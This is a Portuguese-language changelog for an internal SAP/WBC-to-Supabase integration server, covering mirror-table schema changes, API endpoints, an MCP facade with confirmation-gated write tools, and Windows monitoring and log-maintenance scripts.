  `status_ordens_servico_eng`, `vw_os_exped_impressao_v2`, `vw_os_pintura_v0`,
  `vw_os_almox_impressao`, `vw_os_solda`, `wbc_arvore_produto`) e seus 3 logs. Um
  único log `sincronizacao_log_os_integracao`. RLS mantido: RLS enable+force,
  1 policy `select to anon`, escrita só service_role.
- **Chave do pedido: `NPED` → `N_PED`** (a view usa underscore). Ajustados o filtro
  do extractor, o `where_eq` da poda `replace_nped` e as queries da API.
- **Pipeline único.** `_sync_one` (api.py) deixou de fazer o fan-out de 3 sub-syncs:
  os módulos `extract_wbc_arvore.py` e `extract_os_impressao_views.py` foram removidos,
  bem como a 2ª query de expedição — as datas de entrega/liberação e `ObsPedido` agora
  saem da mesma linha (`exped_disponivel` fica `True` p/ compat. com o web).
- **Contrato JSON preservado** (`resumo`/`historico`/`status`): o app web não precisa de
  mudança de código. Status P/R/L/C traduzido pelo dicionário estático de `api.py`
  (a tabela de lookup `status_ordens_servico_eng` foi descontinuada).
- **SQL:** os 8 arquivos antigos em `sql/` foram substituídos por um único
  `sql/vw_os_integracao.sql` (drop das tabelas antigas + create + RLS/policy + log +
  `notify pgrst`). Aplicado em produção (Supabase) em 2026-07-14.

## [2026-07-10] — Espelhos de OS alinhados às views HANA (bloco de filial na solda + DocEntry na expedição)

### Corrigido

- **Schema das tabelas-espelho realinhado às views HANA** que ganharam colunas novas
  durante o desenvolvimento. O INSERT do pipeline (`SELECT *`, casa por NOME via PostgREST)
  falhava com `PGRST204` ("Could not find the '<col>' column ... in the schema cache") ao
  encontrar colunas que a tabela Supabase (criada antes) ainda não tinha:
  - `VW_OS_SOLDA_DETALHE` ganhou o **bloco de endereço da FILIAL** (12 col) → 12 colunas
    novas em `vw_os_solda` (`Filial`, `Tipo Logradouro`, `Rua Filial`, `Nº Filial`, …,
    `Matriz`). Contagem de referência 30 → **42 col**.
  - `VW_OS_EXPED_IMPRESSAO_V2` ganhou `DocEntry_OP`/`DocEntry_PED` → 2 colunas novas em
    `vw_os_exped_impressao_v2`. Contagem 55 → **57 col**.
  - Aplicado em produção via **`sql/alter_espelhos_alinhar_views_2026-07-10.sql`**
    (`add column if not exists` + `NOTIFY pgrst, 'reload schema'`; idempotente). Os DDLs de
    referência (`sql/vw_os_solda.sql`, `sql/os_impressao_views.sql`) foram atualizados p/ a
    (re)criação do ZERO já nascer com as colunas.
- **GOTCHA documentado (nome de coluna herdado do HANA):** o número da filial diverge por
  view — solda usa **`"Nº Filial"`** (espaço + `º` = U+00BA); as views de impressão usam
  **`"NFilial"`** (ASCII). Como o espelho casa por NOME, o nome NÃO pode ser trocado só no
  Supabase (senão `PGRST204`) — só mudando o alias na view HANA. O `N�` que às vezes aparece
  em terminal/print é só render; o byte gravado é UTF-8 íntegro.
- **Round-trip validado em produção** (leitura `anon` de `vw_os_solda`, 672 linhas): o NPED
  84170 gravou `"Nº Filial":"528"` legível (e `São Paulo`/`Indústria` OK), sem `PGRST204`.
  Consumidor futuro deve normalizar num adapter: `row["Nº Filial"] ?? row["NFilial"]` — hoje
  nenhum consumidor lê essas colunas por nome.

## [2026-07-10] — Detalhe de pedido inclui os campos de EXPEDIÇÃO (entrega/liberação/obs)

### Adicionado

- **`GET /ordens-servico/<nped>` agora enriquece o `resumo` com a view de expedição.**
  Além das colunas da `ordens_servico_engenharia`, lê **1 linha** do espelho
  `vw_os_exped_impressao_v2` (`_fetch_exped_campos`, `.order('id').limit(1)` p/ ser
  determinístico) e injeta no resumo: `data_entrega` (`DtEntregaPED`), `data_liberacao`
  (`DtLiber`), `obs` (`Obs`) e a **`data_pedido` OFICIAL** (`DtPedido` da expedição, que
  DIVERGE da engenharia — ex. NPED 84080: 15/06 na expedição vs 24/06; a antiga fica em
  `data_pedido_engenharia`). O flag **`exped_disponivel`** distingue os três estados:
  campo ausente (8077 antiga) / `false` (pedido sem sync das views) / `true` (dado oficial).
  Best-effort: falha na leitura da expedição **nunca** derruba o GET (segue com o resumo
  base). O `POST /ordens-servico/<nped>/sincronizar` também devolve o resumo fresco com
  esses campos. Alimenta as novas perguntas por pedido do Assistente Mira (data de entrega/
  colocação/liberação/observações). Testes: +4 em `tests/test_api.py`.
  **Deploy .11:** `git pull` + `nssm restart OrcaView-OS-API` — fazer **ANTES** do web (.90),
  senão a Mira responde "servidor de integração precisa ser atualizado" nesses campos.

## [2026-07-07] — Sincronizar um pedido também espelha a view de solda (`vw_os_solda`)

### Adicionado

- **Sincronizar um pedido agora atualiza 6 tabelas** (antes 5): entrou o espelho DIRETO
  da view SAP HANA `VW_OS_SOLDA_DETALHE` → `vw_os_solda` (30 colunas, detalhe de solda),
  filtrada por `NPED` com `replace_nped`, idêntica às views de impressão. Basta **1 par**
  novo no registry `config.OS_IMPRESSAO_VIEWS` — a carga passa a ser **automática** tanto
  no gatilho via **API** (`POST /ordens-servico/<nped>/sincronizar`) quanto via **MCP**
  (`sincronizar_pedido_os`), sem tocar em `api.py`/MCP. A tabela aparece no bloco
  `impressao` da resposta do sync e no log compartilhado `sincronizacao_log_os_impressao`.
- **DDL `sql/vw_os_solda.sql`** — tabela + índices (`NPED`/`CodigoOrcam`/`id_execucao`) +
  RLS enable+force + policy de SELECT p/ `anon` (leitura read-only pelo projeto consumidor,
  mesmo padrão das views de impressão). +1 teste em `tests/test_os_impressao_views.py`.
  Nota: apesar do nome do registry (`OS_IMPRESSAO_VIEWS`), solda ≠ impressão — só
  reaproveita o mesmo mecanismo (comentário atualizado no `config.py`).

## [2026-07-07] — Logs: retenção de 6 dias (era 12) e MCP com log próprio e enxuto

### Alterado

- **Retenção de log caiu de 12 → 6 dias** nos dois serviços que usam
  `TimedRotatingFileHandler` (apagam sozinhos o excedente): `api.py` (`api.log`,
  `backupCount=6`) e `scripts/scheduled_execution.py` (`scheduled_execution.log`,
  `LOG_RETENTION_DAYS=6`). Continuam **separados** (são 2 serviços Windows distintos;
  um único arquivo compartilhado disputaria o rename da rotação à meia-noite).
- **`mcp_service.log` agora é escrito pelo próprio processo Python** (`mcp/serve_http.py`),
  via `TimedRotatingFileHandler` de 6 dias com auto-delete — mesmo padrão dos outros dois.
  Antes o arquivo era gerido pelo NSSM (rotação por 5 MB, que **nunca apagava** os antigos).
  O log de acesso por-requisição do uvicorn foi desligado (`access_log=False`) p/ enxugar.
- **`install_mcp_service.bat`**: removidas as linhas `AppStdout`/`AppStderr`/`AppRotate*`
  que apontavam p/ `mcp_service.log` — o NSSM não pode mais segurar o handle do arquivo
  (travaria o rename da rotação do Python). Em serviço já instalado é preciso rodar uma vez:
  `nssm reset OrcaView-MCP AppStdout` (idem `AppStderr` e `AppRotateFiles`) + restart.

## [2026-07-06] — Sincronizar um pedido também espelha 3 views de impressão de OS do HANA

### Adicionado

- **Sincronizar um pedido agora atualiza 5 tabelas** (antes 2): além de
  `ordens_servico_engenharia` + `wbc_arvore_produto`, dispara (best-effort, após a OS OK,
  igual à árvore WBC) o espelho DIRETO de 3 views do SAP HANA (`SBOALTAMIRAPROD`),
  filtradas por `NPED`, com estratégia `replace_nped` (poda escopada ao NPED):
  `VW_OS_EXPED_IMPRESSAO_V2` → `vw_os_exped_impressao_v2` (55 col),
  `VW_OS_PINTURA_V0` → `vw_os_pintura_v0` (55 col),
  `VW_OS_ALMOX_IMPRESSAO` → `vw_os_almox_impressao` (34 col; usa `CodCli`, não `CodClien`).
  As tabelas têm o MESMO nome das views (minúsculo). Colunas com espaço
  (`"CEP Filial"`, `"CNPJ Filial"`, etc.) preservadas com aspas.
- **Novo módulo `extract_os_impressao_views.py`** — extrator genérico das 3 views numa
  única conexão HANA (registry em `config.OS_IMPRESSAO_VIEWS`), reusando `pipeline_core`.
  Chaveia no `api._sync_one` via `_sync_impressao_safe` (nunca quebra a OS); a resposta
  do sync ganha o bloco `impressao: {tabela: bool}`.
- **DDL `sql/os_impressao_views.sql`** — 3 tabelas + log compartilhado
  `sincronizacao_log_os_impressao` + índices (NPED/CodigoOrcam/id_execucao) + RLS
  enable+force + policy de SELECT p/ `anon` nas 3 tabelas de dados (log trancado).
- Config: `OS_IMPRESSAO_SYNC_LOG_TABLE` / `OS_IMPRESSAO_INSERT_BATCH_SIZE` (opcionais).
  +7 testes (`tests/test_os_impressao_views.py`). Validado ponta a ponta com o NPED 84080
  (374/328/14 linhas; leitura confirmada pela chave `anon` — a mesma da equipe consumidora).

### Removido

- **`sql/vw_os_exped_impressao.sql`** (view derivada dos espelhos, que perdia colunas —
  Filial/OITM/ALMX saíam `NULL`) — substituída pela tabela-espelho DIRETA do HANA
  `vw_os_exped_impressao_v2`, completa. O detalhe da árvore WBC (explosão do BOM) foi
  mantido, isolado, em `sql/vw_os_exped_arvore.sql` (com `drop view if exists` da antiga).

## [2026-07-06] — `total_orcamento` do resumo de OS = SOMA das linhas (era valor de UMA linha)

### Corrigido

- **`GET /ordens-servico/<nped>`: `resumo.total_orcamento` devolvia o `TotalOrcam` da
  PRIMEIRA linha — mas o campo é POR LINHA na view** (350 valores distintos num pedido
  real), não um cabeçalho repetido, e a ordem entre cargas não é estável: o "total" do
  84080 variava (205,92 → 96,78) num orçamento de ~R$ 3,05 mi. Agora `_soma_total_orcamento`
  SOMA as linhas (tolerante a nulos/valores não numéricos; `null` se nenhuma linha tem valor) —
  o resultado é o valor de mercadorias (sem impostos). Consumidores que precisam do total
  a pagar (com impostos) devem ler o `DocTotal` do pedido no SAP (é o que o Assistente Mira
  do web passou a fazer). Detectado nos testes do branch SAP/OS da Mira (web V117.152).
  +2 asserts/teste (suíte **166 passed**).

## [2026-07-03] — Diagnóstico distingue pedido cancelado × sem OS + respostas sem acento

### Adicionado

- **`diagnosticar_nped` agora consulta também a `ORDR` (status do PEDIDO)**, na mesma conexão,
  best-effort (falha na ORDR não invalida o diagnóstico da OS; chaves `pedido_*` ficam `null`).
  Novas chaves: `pedido_existe`, `pedido_cancelado`, `pedido_status` (`Aberto`/`Cancelado`/
  `Fechado` — `CANCELED` `'Y'`/`'C'` = cancelado; `DocStatus` `'C'` sem cancelamento = fechado).
- **Novos `tipo` na resposta de sync** (antes tudo caía em `sem_os`): `pedido_cancelado`
  ("Pedido cancelado no SAP - nao ha OS a sincronizar.") e `pedido_nao_encontrado`
  ("Pedido nao encontrado no SAP."). O `sem_os` ganhou o status no texto
  ("OS ainda nao gerada para este pedido (pedido aberto)."). Todas as respostas de sync
  incluem `status_pedido`. Painel web: badges `PEDIDO CANCELADO` / `NAO ENCONTRADO` /
  `OS CANCELADA`. Retrocompatível: diag sem as chaves novas cai no `sem_os` genérico.
  +7 testes (suíte **165 passed**).

### Alterado

- **Mensagens das respostas JSON sem acento, de propósito** (`nao`, `esta`, `historico`,
  `indisponivel`, `invalido`…) — legíveis em qualquer terminal sem depender do escape
  `\uXXXX` do JSON (curl/PowerShell mostravam `não`). Vale p/ `motivo`/`error` da API
  e p/ `coerce_positive_int` (400). Logs e docstrings seguem acentuados.

## [2026-07-03] — Tooling p/ agentes: CLAUDE.md + pyproject.toml (pytest/ruff)

Fases 1 e 2 do plano "menos tokens por tarefa, respostas mais consistentes".
**Sem mudança de comportamento** — suíte **158 passed** antes e depois.

### Adicionado

- **`CLAUDE.md` — guia do repositório para agentes** (carregado automaticamente por sessão):
  mapa de módulos + grafo de dependências, tabela **"tarefa → o que ler"** (a maioria das
  tarefas = 2 arquivos), lista do que **não** reler (CHANGELOG/README inteiro/`exports/`/
  `logs/`/`state/`) e gotchas operacionais (scheduler via `-m scripts.scheduled_execution`,
  entry `python api.py` vs `waitress-serve`, `get_settings()` cacheado, `.ps1` ASCII,
  repo GitHub mantém nome antigo, deploy = `git pull` na `.11`).
- **`pyproject.toml` — config central de tooling** (pytest `testpaths` + ruff: regras
  `E, W, F, I`, linha 120, `E741` ignorado de propósito). **NÃO** tem `[project]`/
  `[build-system]`: `requirements.txt` segue sendo a fonte de instalação do deploy
  (decisão explícita, comentada no próprio arquivo). `ruff==0.15.20` pinado no
  `requirements-dev.txt`.

### Alterado

- **Baseline de lint zerada** (`python -m ruff check .` → 0): 12 achados mecânicos
  auto-corrigidos — ordenação de imports (7 módulos), whitespace em linha vazia (3) e
  2 imports sem uso (`typing.List` em `extract_wbc_arvore.py`, `os` em `tests/test_config.py`).
  Diff 22+/21− em 8 arquivos, nenhum caminho de execução alterado.

## [2026-07-03] — Fachada MCP (Fase 4, escrita com confirmação) + endpoint de sync

### Adicionado

- **`POST /ordens-servico/<nped>/sincronizar` (API 8077) — par de ESCRITA do `GET`.** Sincroniza
  (SAP → Supabase) a OS de um pedido e devolve o `resumo` resultante **numa chamada**. Reúsa
  `_sync_one` (serializado no `_sync_lock`): diagnostica a OWOR antes — se não há OS gerada ou está
  cancelada, devolve o aviso **sem sincronizar**. Idempotente (`replace_nped`) + dispara a árvore WBC
  (best-effort). Status `200` (sincronizado **ou** aviso sem_os/cancelada) · `502` (falha de sync) ·
  `400`/`401`. +6 testes (suíte **155 passed**).
- **`mcp/` — Fase 4: 2 tools de ESCRITA com confirmação humana.** `sincronizar_pedido_os(nped, confirmar?)`
  (usa o endpoint acima) e `forcar_carga_oportunidades(confirmar?)` (`POST /oportunidades/sincronizar`;
  `409` se já houver carga). **Confirmação em 2 camadas:** (1) `annotations` (`readOnlyHint=False`,
  `idempotentHint=True`, `openWorldHint=True`) — o cliente MCP sinaliza que é escrita e pede aprovação;
  (2) **preview-então-confirma** — com `confirmar=False` (default) a tool **não escreve**: devolve um
  preview do estado atual + instrução pro modelo mostrar ao usuário e só chamar com `confirmar=True`
  após o "sim". Novo helper `_post` (mesmo tratamento de erro do `_get`; repassa o 409). Validado:
  preview **read-only** contra a `.11` (não escreve). 10 tools no total (8 leitura + 2 escrita).
- **Rate-limit nas ESCRITAS (trava anti-loop), no lado da API.** Janela deslizante in-process,
  thread-safe, por bucket — **generosa** (não atrapalha uso normal, pega runaway/loop de agente):
  default **60** syncs de OS/min (`sync_os`) e **6** cargas completas/min (`force_oport`),
  configurável por env `RATE_SYNC_OS_MAX` / `RATE_FORCE_OPORT_MAX`. Aplicada em
  `POST /ordens-servico/<nped>/sincronizar` e `POST /oportunidades/sincronizar`; se estourar,
  responde **`429`** com `Retry-After` + motivo (o `_post` do MCP repassa à tool → o modelo para).
  +3 testes (suíte **158 passed**).

## [2026-07-03] — Fachada MCP (Fase 3, modo remoto HTTP) — código

### Adicionado

- **`mcp/serve_http.py` — modo remoto da fachada MCP (Streamable HTTP + token estático).**
  Serve o **mesmo** FastMCP (tools + resources da Fase 1) via uvicorn, atrás de um middleware
  ASGI que exige `Authorization: Bearer <SIS_MCP_TOKEN>` (401 sem/errado; encaminha o escopo
  `lifespan` p/ o session-manager iniciar; compara com `hmac.compare_digest`). **Não** usa
  `mcp.run("streamable-http")` (que sobe o uvicorn interno sem hook de auth) — monta
  `mcp.streamable_http_app()` + `uvicorn.run`. Config via `mcp/.env`: `SIS_MCP_TOKEN`,
  `SIS_MCP_HOST` (default `0.0.0.0`), `SIS_MCP_PORT` (default `8078`), `SIS_API_BASE` (na `.11`
  = `http://127.0.0.1:8077` → a `OS_API_KEY` **nunca sai do servidor**). A stdio (`mcp_server.py`)
  fica intacta p/ uso local. **Testado localmente:** sem token → 401, token errado → 401, token
  válido → 400 (passou pelo auth; 400 = handshake MCP). Sem TLS (rede interna, decisão do usuário).
- **`run_mcp.bat` + `install_mcp_service.bat`** — sobem o MCP HTTP como serviço Windows via NSSM
  (`OrcaView-MCP`, `SERVICE_AUTO_START`, `DependOnService OrcaView-OS-API`, logs rotativos),
  espelhando o padrão do `OrcaView-OS-API` (8077). `uvicorn` adicionado ao `mcp/requirements.txt`.
- **Seção "Modo remoto" no `mcp/README.md`** — passo-a-passo de deploy na `.11` (git pull + deps +
  `mcp/.env` + `install_mcp_service.bat` + firewall por IP), registro do cliente
  (`claude mcp add --transport http … --header "Authorization: Bearer …"`), validação e rollback.
  **`web_orcaview_V117` (.90): nenhuma mudança** — consome só a REST `/status`; a Mira não faz
  tool-calling.

### Corrigido

- **`serve_http.py`: HTTP 421 "Invalid Host header" ao acessar pela LAN.** A proteção
  DNS-rebinding do transporte StreamableHTTP (`TransportSecurityMiddleware`) vem **ativa por
  default no `mcp` 1.28.1** da `.11` e só aceita `Host` loopback → um cliente chegando por
  `http://192.168.7.11:8078/mcp` levava 421. O `build_app()` passou a setar
  `mcp.settings.transport_security = TransportSecuritySettings(enable_dns_rebinding_protection=False)`
  **antes** do `streamable_http_app()` (seguro: o acesso já é barrado pelo `StaticBearerMiddleware`,
  a rede é interna e os clientes são apps MCP, não navegadores). Reproduzido o 421 e **verificado o
  fix** (Host LAN → 406/400). **MCP remoto no ar na `.11`** (serviço `OrcaView-MCP`). O
  `PLANO_FASE3.md` foi removido — o conteúdo operacional está consolidado no `mcp/README.md`.
- **`mcp_server.py`: `httpx` com `trust_env=False` — não usa proxy do ambiente na chamada à API
  interna.** O serviço `OrcaView-MCP` (LocalSystem) herdava um proxy HTTP do ambiente da máquina
  e o `httpx` roteava **até a chamada de `127.0.0.1:8077`** pelo proxy → **WinError 10061 "conexão
  recusada"** mesmo com a API no ar (um `curl` interativo, sem proxy no perfil do usuário,
  funcionava — daí a assimetria). Como a fachada só fala com a API interna (loopback/LAN),
  `trust_env=False` ignora qualquer `HTTP_PROXY`/`ALL_PROXY` do ambiente. Validado: `verificar_saude`
  → `ok` contra a `.11`. (Obs.: no incidente real desta `.11` não havia proxy — a causa foi o loopback
  abaixo — mas `trust_env=False` fica como endurecimento correto: uma fachada interna nunca deve usar proxy.)
- **`SIS_API_BASE` na `.11`: loopback → IP da própria máquina (LocalSystem não alcança a pseudo-interface
  de loopback).** O serviço `OrcaView-MCP` roda como **LocalSystem (Sessão 0)** e, neste servidor, esse
  contexto **não conecta em `127.0.0.1:8077`** (`WinError 10061`) — apesar da API no ar e do `curl` +
  `verificar_saude` **interativos** (usuário admin) darem 200. Sem venv, sem proxy: a única diferença era
  o contexto do serviço. Fix (config, no `mcp/.env` gitignored): `SIS_API_BASE=http://192.168.7.11:8077`
  (a API escuta em `0.0.0.0`; o pacote segue local, a chave não sai da máquina). Documentado no README
  (seção "Modo remoto" → Gotcha). **MCP remoto respondendo as tools no Claude** (ex.: `listar_pedidos_com_os`,
  `detalhe_pedido_os`). Fase 3 concluída ponta a ponta.

## [2026-07-03] — Detalhe de OS (endpoint) + Fachada MCP (Fase 1, read-only)

### Adicionado

- **`GET /ordens-servico/<nped>` (API 8077)** — detalhe da OS de **um** pedido, lendo o espelho
  `ordens_servico_engenharia` no Supabase (service_role). Devolve um `resumo` (cliente, status +
  `status_desc`, total, nº de linhas e de OPs, última sincronização) e, com `?linhas=1`, também as
  `linhas` (colunas **enxutas**, sem os textos NCLOB — evita puxar MBs por chamada). **404** se o
  pedido não tem OS sincronizada; requer `X-API-Key`. A rota estática `/ordens-servico/disponiveis`
  mantém prioridade sobre o `<nped>` dinâmico no roteador do Werkzeug. +9 testes (suíte **146 passed**).
- **`mcp/` — Fase 1 da fachada MCP: +3 tools + 2 resources (segue 100% leitura).** Tools:
  `detalhe_pedido_os(nped, incluir_linhas?)` (usa o endpoint acima), `estado_tarefa_wbc()` (só o
  bloco `scheduled_task` do `/status`), `ultimos_erros(limit?)` (filtra as falhas do `/historico`).
  **Resources** (contexto anexável sem gastar tool-call): `sap-integracao://status` e
  `sap-integracao://historico-os`. O helper `_get` passou a repassar corpo JSON de erro estruturado
  — um 404 vira a mensagem real (ex.: "pedido sem OS sincronizada") em vez de "HTTP 404"; um 404 **HTML**
  do Flask sinaliza rota não deployada. Isolado: só mexe em `mcp/` (nada no app/web/Supabase).

## [2026-07-02] — Fachada MCP (Fase 0, read-only)

### Adicionado

- **`mcp/` — servidor MCP (fachada fina)** que expõe os endpoints da API REST (8077)
  como *tools* para clientes MCP (Claude Desktop/Code, assistente Mira), permitindo
  operar/consultar o servidor de integração em linguagem natural. **Camada aditiva e
  isolada:** não reimplementa lógica, não fala com SAP/SQL/Supabase direto, não roda
  agendador — cada tool só chama um endpoint HTTP existente; quem toca o banco continua
  sendo a API. **Fase 0 = 100% leitura:** `verificar_saude` (`/status`),
  `listar_sincronizacoes_os` (`/historico`), `listar_sincronizacoes_oportunidades`
  (`/oportunidades/historico`), `info_oportunidades` (`/oportunidades/info`),
  `listar_pedidos_com_os` (`/ordens-servico/disponiveis`). Implementado com o MCP Python
  SDK (FastMCP, transporte stdio) + httpx; a `SIS_API_KEY` fica no server MCP (injetada
  server-side no `X-API-Key`, nunca vai ao LLM). Config em `mcp/.env` (`SIS_API_BASE`,
  `SIS_API_KEY`); instruções de registro em `mcp/README.md`. Ações de escrita ficam para
  a Fase 2 (com confirmação humana). Não requer mudança nos consumidores nem no Supabase.

## [2026-07-02] — Limpeza diária de logs do Azure (manutenção do servidor .11)

### Adicionado

- **`maintenance/clean_azure_logs.ps1`** — script que apaga logs antigos de
  `C:\WindowsAzure\Logs` (guest agent do Azure: `TransparentInstaller.log`, `WaAppAgent`,
  `MonitoringAgent`, `*.etl`… que se acumulam em ~10 MB cada). Remove **apenas arquivos do dia
  anterior para trás** (mantém os de hoje; `-KeepDays` configurável), **pula arquivos em uso**
  pelo agente (sem erro) e **nunca apaga pastas**; recusa caminho vazio/raiz de disco. Tem
  `-DryRun` (lista sem apagar) e `-Install` (registra a tarefa diária `OrcaView-Clean-Azure-Logs`
  às 06:00 como SYSTEM, usando `-Command "& '<script>'"` — não `-File`, pelo mesmo motivo do
  monitor). Grava resumo em `maintenance/clean_azure_logs.log`. 100% ASCII (PowerShell 5.1).

## [2026-07-02] — Monitor da tarefa agendada "Integração WBC" no `/status`

### Ajustado (pós-deploy)

- **`install_monitor_task.ps1`: a tarefa passou a usar `-Command "& '<script>'"` em vez de
  `-File`.** Causa raiz do monitor "Desatualizado" em produção: a tarefa `OrcaView-Monitor-WBC-Task`
  rodava `powershell.exe -File "…monitor_wbc_task.ps1"` e, **sob SYSTEM + não-interativo**
  (PowerShell 5.1), falhava com `LastTaskResult=1` **sem executar o script** (não gravava
  estado nem log) — enquanto na mão (administrador) e via `-Command "& '…ps1'"` o **mesmo**
  script roda até o fim e grava o estado (comprovado capturando a saída da execução SYSTEM).
  Trocado o `-File` por `-Command "& '<script>'"` (aspas simples dobradas p/ robustez). Tarefas
  já registradas: re-rodar `install_monitor_task.ps1` (idempotente) ou `Set-ScheduledTask`.
- **`monitor_wbc_task.ps1`: log de diagnóstico + escrita com fallback.** Novo
  `state/monitor_wbc_task.log` (grava resultado de cada execução e a exceção real na falha),
  `trap` global e fallback de escrita (se o `Move-Item` de replace falhar → `WriteAllText`
  direto). Fim do `exit 1` silencioso.
- `monitor_wbc_task.ps1`: `LastTaskResult` agora usa `[int64]` (HRESULT/exit code pode
  exceder Int32, ex. `0x800710E0`, que estourava e caía no catch). Além disso, o código
  `0x800710E0` (Win32 4320 = "operador/administrador recusou o pedido" — no Task Scheduler
  quase sempre um **disparo sobreposto pulado**, não falha do programa) passou a ser uma
  **nota** informativa (novo campo `notes` no JSON), sem afetar `healthy` nem gerar alerta.
  Falhas reais (qualquer outro código ≠ 0/running/never-run) continuam como `problems`.

### Adicionado

- **`monitor_wbc_task.ps1`** — script PowerShell que consulta a tarefa agendada do Windows
  **"Integração WBC"** (`Get-ScheduledTask`/`Get-ScheduledTaskInfo`) e grava o estado em
  `state/wbc_task_state.json` (escrita atômica, UTF-8 sem BOM). Detecta: tarefa desabilitada,
  travada em execução (`Running` > 10 min), última execução com erro (`LastTaskResult`),
  ausência de execução (> 15 min sem rodar) e gatilhos perdidos. Nunca lança exceção para
  fora (falhas viram `problems` no JSON); mantido **100% ASCII** de propósito (PowerShell 5.1
  lê `.ps1` sem BOM como ANSI e corromperia acentos — o nome da tarefa é montado via códigos
  de caractere).
- **Check `scheduled_task` no `/status`** (`monitoring.py`) — a API apenas **lê** o JSON do
  monitor (sem subprocesso por request) e o expõe em `GET /status`, alimentando `alerts[]` e
  o `?strict=1` (**HTTP 503** quando a tarefa está ruim). Se o JSON ficar mais velho que
  `WBC_TASK_STALE_MIN` (default 25 min), sinaliza "monitor possivelmente parado". Novo alias
  `?checks=tarefa` (também `task`, `wbc_task`).
- **`install_monitor_task.ps1`** — registra (idempotente) a tarefa que roda o monitor a cada
  10 min como **SYSTEM** (dispensa senha e enxerga a tarefa do `administrador`) + execução
  inicial.
- **`deploy_monitor.ps1`** / **`deploy_monitor.bat`** — deploy em um passo: copia os arquivos
  (se necessário), roda o install e reinicia o serviço `OrcaView-OS-API`.
- **Settings** (`config.py`): `WBC_TASK_NAME`, `WBC_TASK_STATE_FILE`, `WBC_TASK_STALE_MIN`
  (documentados no `.env.example`). Testes cobrindo saudável/travada/stale/ausente + o quirk
  do `ConvertTo-Json` do PowerShell 5.1 (array de 1 item vira escalar).

## [2026-06-30] — Views de relatório (adaptação da VW_OS_EXPED_IMPRESSAO_V2)

### Adicionado

- **`sql/vw_os_exped_impressao.sql`** — duas views PostgreSQL que adaptam a view SAP
  `SBOALTAMIRAPROD.VW_OS_EXPED_IMPRESSAO_V2` para as tabelas-espelho do Supabase:
  - `vw_os_exped_impressao` (V2 fiel, ramo EXP nível 1) — vem **só** de
    `ordens_servico_engenharia` (o espelho já traz os campos do orçamento); **não junta** a
    árvore → não multiplica linhas.
  - `vw_os_exped_arvore` (BOM detalhado) — **1 linha por componente** da árvore WBC com o
    cabeçalho do pedido; junta por `CodigoOrcam = ORCNUM` (cabeçalho colapsado por `NPED` p/
    não inflar).
  - Campos de Filial (OBPL), grupos de item (OITM) e ramo ALMX ficam **NULL** (fontes não
    espelhadas). Mapeamento coluna-a-coluna + SQL verificados por revisão adversarial
    (3/3, nenhuma coluna inexistente). Guia em `docs/CONSUMO_DADOS.md`.

## [2026-06-30] — Guia de consumo (read-only) no repositório

### Documentação

- **`docs/CONSUMO_DADOS.md`** — guia **sanitizado** (sem chaves) para a equipe consumidora:
  tabelas e campos de `ordens_servico_engenharia`, `status_ordens_servico_eng` e
  `wbc_arvore_produto`; como ligar `NPED` → `ORCNUM` (`CodigoOrcam`) → árvore; e exemplos
  **read-only** em REST/JS/Python. As credenciais (URL + chave `anon`) seguem só no handoff
  confidencial, fora do git (`HANDOFF_*.md`).

## [2026-06-30] — fix WBC: ORCNUM vem de `CodigoOrcam` (não `NºOrçament`)

### Corrigido

- `resolver_orcnum` lia o ORCNUM do pedido em `NºOrçament`, que na view de OS vem **nulo**
  → a sync da árvore falhava (`orcnum=None`). Passa a usar
  `COALESCE("CodigoOrcam", "NºOrçament")` — o código está em `CodigoOrcam`. Validado no SAP
  real (84112 → `00124853`, 34 linhas carregadas). DDL/PLANO/teste ajustados.

## [2026-06-30] — Árvore de Produto WBC (sub-sync após a OS)

### Adicionado

- **Sincronização da árvore WBC** (`WBCCAD.dbo.INTEGRACAO_ORCPRDARV`) para o Supabase,
  disparada **após a OS** de um pedido quando a OS está OK (existe e não cancelada) — sem
  mudança para o usuário (mesmo botão "Sincronizar"). Novo `extract_wbc_arvore.py`:
  resolve o `ORCNUM` (= `NºOrçament` na view de OS do SAP) → `SELECT * INTEGRACAO_ORCPRDARV
  WHERE ORCNUM=?` → grava em `wbc_arvore_produto` com **replace por ORCNUM**
  (carrega-depois-poda escopado) + log em `sincronizacao_log_wbc_arvore`. Hook em
  `api.py` (`_sync_one`) é **best-effort**: falha na árvore não quebra a resposta da OS
  (vem no campo `wbc`).
- **DDL Supabase**: `sql/wbc_arvore.sql` (tabela espelho + log, RLS forçado sem policy) e
  `sql/wbc_arvore_read_policy.sql` (SELECT para `anon` → consumidor read-only com a anon key).
- Config `WBC_ARVORE_VIEW` / `WBC_ARVORE_TABLE` / `WBC_ARVORE_SYNC_LOG_TABLE` /
  `WBC_ARVORE_INSERT_BATCH_SIZE`. `db_utils.read_dbapi_query` passa a aceitar `params`
  (consulta parametrizada). Plano em `PLANO_WBC_ARVORE.md`.
- **Supabase aplicado em produção (2026-06-30):** `wbc_arvore.sql` + `wbc_arvore_read_policy.sql`
  rodados e verificados — RLS forçado nas 2 tabelas, policy `SELECT` para `anon` e case das
  colunas confere. Pendente: deploy do código no servidor + 1 teste real.

## [2026-06-30] — `/status` aberto + chave aceita via `?key=`

### Alterado

- **`/status` agora é aberto** (sem `X-API-Key`) — pensado p/ monitoramento e p/ abrir
  direto no navegador (dados de rede interna; painel roda só na intranet).
- **A autenticação aceita a chave por query string** `?key=` / `?api_key=`, além do header
  `X-API-Key` e do `Authorization: Bearer`. Assim os endpoints autenticados funcionam no
  navegador (que não envia header). Obs.: por query string a chave aparece na URL/histórico
  do navegador — em terminal, prefira o header via `curl ... -H "X-API-Key: ..."`.

## [2026-06-30] — Monitoramento via `/status` + botão limpar

### Adicionado

- **Endpoint `GET /status`** (sob demanda, requer `X-API-Key`) — diagnóstico do servidor e
  dependências **sem polling** (roda só quando chamado). Lógica em `monitoring.py`. Checa
  **SAP**, **SQL Server (WBC)** e **Supabase** com latência (`ms`) por item; traz **sistema**
  (host/IP/SO/Python/uptime/disco e CPU+memória via `psutil`, se instalado). O `/health`
  segue **leve** (liveness) de propósito — não faz checagem externa.
  - **Sinal indireto do agendador** (`scheduler`): idade da última carga de oportunidades
    (lida do log); `stale=true` se passar de **35 min dentro da janela comercial** (dia útil
    07–18h) — indica possível queda do `OrcaView-Scheduler`.
  - **Alerta de disco** da unidade do app (`disk_low`) + lista legível em `alerts`.
  - **`?checks=sap,sql`** roda só as checagens escolhidas (`sap`, `sql`/`sql_server`,
    `supabase`, `scheduler`/`agendador`); **`?strict=1`** devolve **HTTP 503** se houver
    falha de conexão **ou** alerta (p/ monitores por código de status).
  - `psutil` adicionado ao `requirements.txt` (opcional — sem ele, o `/status` funciona e
    CPU/memória ficam indisponíveis).
